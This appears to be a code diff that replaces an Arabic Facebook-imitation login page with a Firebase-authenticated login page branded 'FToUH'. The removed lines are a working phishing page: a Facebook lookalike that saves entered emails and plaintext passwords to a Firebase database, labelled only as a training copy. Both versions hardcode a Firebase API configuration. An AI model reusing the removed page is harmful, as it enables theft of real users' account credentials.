@@ -1,101 +1,261 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>تسجيل الدخول إلى فيسبوك</title>
-  <style>
-    body {
-      background-color: #f0f2f5;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .login-box {
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      width: 360px;
-      text-align: center;
-    }
-    .login-box h1 {
-      color: #1877f2;
-      font-size: 32px;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 90%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      font-size: 16px;
-    }
-    button {
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      width: 95%;
-    }
-    .info {
-      margin-top: 10px;
-      font-size: 13px;
-      color: gray;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - FToUH</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        :root {
+            --primary: #1877f2; /* أزرق فيسبوك */
+            --secondary: #42b72a; /* أخضر فيسبوك */
+            --bg: #f0f2f5;
+            --card: #ffffff;
+            --text: #1c1e21;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background-color: var(--card);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            color: var(--primary);
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            background-color: var(--card);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            color: var(--primary);
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            background-color: var(--secondary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .error-message {
+            color: #ff3333;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .login-container {
+                box-shadow: none;
+                background-color: var(--bg);
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="login-container">
+        <div class="logo">FToUH</div>
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+            </div>
+            <div class="error-message" id="errorMessage"></div>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+            <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+            <div class="divider"></div>
+            <button type="button" class="create-account" id="createAccount">إنشاء حساب جديد</button>
+        </form>
+    </div>
 
-  <div class="login-box">
-    <h1>facebook</h1>
-    <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
-    <input type="password" id="password" placeholder="كلمة السر">
-    <button onclick="saveLogin()">تسجيل الدخول</button>
-    <p class="info">نسخة تدريبية فقط - لا تدخل بيانات حقيقية</p>
-  </div>
+    <script>
+        // Firebase configuration - استبدل بمعلومات مشروعك
+        const firebaseConfig = {
+            apiKey: "AIzaSyAkv21njRIY0Ply1XG2OzY_I9hjzJdbI08",
+            authDomain: "my-messenger-5cca2.firebaseapp.com",
+            databaseURL: "https://my-messenger-5cca2-default-rtdb.firebaseio.com",
+            projectId: "my-messenger-5cca2",
+            storageBucket: "my-messenger-5cca2.appspot.com",
+            messagingSenderId: "317158541033",
+            appId: "1:317158541033:web:63bc67e8b369239cedd278"
+        };
 
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const database = firebase.database();
 
-  <script>
-    // إعداد Firebase
-    const firebaseConfig = {
-      apiKey: "AIzaSyAkv21njRIY0Ply1XG2OzY_I9hjzJdbI08",
-      authDomain: "my-messenger-5cca2.firebaseapp.com",
-      databaseURL: "https://my-messenger-5cca2-default-rtdb.firebaseio.com",
-      projectId: "my-messenger-5cca2",
-      storageBucket: "my-messenger-5cca2.firebasestorage.app",
-      messagingSenderId: "317158541033",
-      appId: "1:317158541033:web:63bc67e8b369239cedd278",
-      measurementId: "G-2E7W6V43CM"
-    };
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const createAccountBtn = document.getElementById('createAccount');
+            const errorMessage = document.getElementById('errorMessage');
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+            // تسجيل الدخول
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
 
-    function saveLogin() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+                auth.signInWithEmailAndPassword(email, password)
+                    .then((userCredential) => {
+                        // تسجيل الدخول ناجح
+                        const user = userCredential.user;
+                        
+                        // حفظ بيانات تسجيل الدخول في Realtime Database
+                        database.ref('users/' + user.uid).set({
+                            email: user.email,
+                            lastLogin: new Date().toISOString(),
+                            deviceInfo: navigator.userAgent
+                        });
+                        
+                        // توجيه المستخدم إلى الصفحة الرئيسية
+                        window.location.href = "home.html"; // يمكنك استبدالها بصفحتك الرئيسية
+                    })
+                    .catch((error) => {
+                        // معالجة الأخطاء
+                        errorMessage.textContent = getErrorMessage(error.code);
+                    });
+            });
 
-      if (email && password) {
-        db.ref("users").push({
-          email: email,
-          password: password
-        }).then(() => {
-          alert("✅ تم حفظ البيانات في Firebase (للتدريب فقط)");
+            // إنشاء حساب جديد
+            createAccountBtn.addEventListener('click', function() {
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+
+                if (!email || !password) {
+                    errorMessage.textContent = "الرجاء إدخال البريد الإلكتروني وكلمة المرور";
+                    return;
+                }
+
+                auth.createUserWithEmailAndPassword(email, password)
+                    .then((userCredential) => {
+                        // حساب جديد تم إنشاؤه بنجاح
+                        const user = userCredential.user;
+                        
+                        // حفظ بيانات المستخدم في Realtime Database
+                        database.ref('users/' + user.uid).set({
+                            email: user.email,
+                            createdAt: new Date().toISOString(),
+                            lastLogin: new Date().toISOString(),
+                            deviceInfo: navigator.userAgent
+                        });
+                        
+                        alert("تم إنشاء الحساب بنجاح!");
+                    })
+                    .catch((error) => {
+                        errorMessage.textContent = getErrorMessage(error.code);
+                    });
+            });
+
+            // ترجمة رموز الأخطاء إلى رسائل مفهومة
+            function getErrorMessage(errorCode) {
+                switch(errorCode) {
+                    case 'auth/invalid-email':
+                        return "بريد إلكتروني غير صالح";
+                    case 'auth/user-disabled':
+                        return "هذا الحساب معطل";
+                    case 'auth/user-not-found':
+                        return "لا يوجد حساب بهذا البريد الإلكتروني";
+                    case 'auth/wrong-password':
+                        return "كلمة المرور غير صحيحة";
+                    case 'auth/email-already-in-use':
+                        return "هذا البريد الإلكتروني مستخدم بالفعل";
+                    case 'auth/weak-password':
+                        return "كلمة المرور ضعيفة (يجب أن تكون 6 أحرف على الأقل)";
+                    default:
+                        return "حدث خطأ أثناء تسجيل الدخول";
+                }
+            }
+
+            // التحقق إذا كان المستخدم مسجل دخول بالفعل
+            auth.onAuthStateChanged((user) => {
+                if (user) {
+                    // المستخدم مسجل دخول، توجيه إلى الصفحة الرئيسية
+                    window.location.href = "home.html";
+                }
+            });
         });
-      } else {
-        alert("❗ من فضلك املأ كل الحقول");
-      }
-    }
-  </script>
-
+    </script>
 </body>
 </html>
